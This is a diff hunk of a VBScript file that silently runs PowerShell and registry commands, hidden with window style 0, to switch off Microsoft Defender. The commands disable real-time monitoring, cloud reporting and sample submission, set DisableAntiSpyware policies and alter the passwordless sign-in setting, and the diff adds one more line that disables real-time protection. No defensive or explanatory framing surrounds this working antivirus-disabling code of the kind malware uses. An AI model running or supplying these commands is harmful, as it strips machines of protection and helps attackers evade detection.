@@ -5,6 +5,7 @@ objShell.Run "powershell.exe -Command Set-MpPreference -DisableRealtimeMonitorin
 objShell.Run "powershell.exe -Command Set-MpPreference -MAPSReporting Disabled", 0, True
 objShell.Run "powershell.exe -Command Set-MpPreference -SubmitSamplesConsent NeverSend", 0, True
 objShell.Run "powershell.exe -Command Set-MpPreference -SubmitSamplesConsent 2", 0, True
+objShell.Run "powershell.exe reg add 'HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection' /v 'DisableRealtimeMonitoring' /t REG_DWORD /d '1' /f", 0, True
 objShell.Run "powershell.exe -Command reg add 'HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Microsoft Defender' /v DisableAntiSpyware /t REG_DWORD /d 1 /f", 0, True
 objShell.Run "powershell.exe -Command reg add 'HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\PasswordLess\Device' /v DevicePasswordLessBuildVersion /t REG_DWORD /d 0 /f", 0, True
 objShell.Run "powershell.exe -Command Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' -Name 'DisableAntiSpyware' -Value 1", 0, True
